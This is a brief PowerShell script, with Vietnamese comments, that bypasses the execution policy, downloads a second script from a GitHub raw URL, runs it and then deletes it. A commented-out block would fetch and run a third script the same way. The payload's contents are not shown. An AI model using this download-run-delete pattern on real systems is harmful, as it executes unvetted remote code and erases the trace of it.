Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

$scriptDir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }

$scriptPath = Join-Path $scriptDir "2.ps1"

# Dùng WebClient thay vì Invoke-WebRequest để tránh lỗi "Cannot find drive"
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile("https://raw.githubusercontent.com/truongcp0305/dp/main/2.ps1", $scriptPath)
} finally {
    if ($wc) { $wc.Dispose() }
}

& $scriptPath

Remove-Item $scriptPath -Force

# Start-Process "https://ncsgroup.vn/"

# Start-Process powershell.exe -ArgumentList @"
# `$scriptPath2 = `"$PSScriptRoot\temp_3.ps1`"
# Invoke-WebRequest -Uri `"https://raw.githubusercontent.com/truongcp0305/dp/main/3.ps1`" -OutFile `$scriptPath2
# & `$scriptPath2
# "@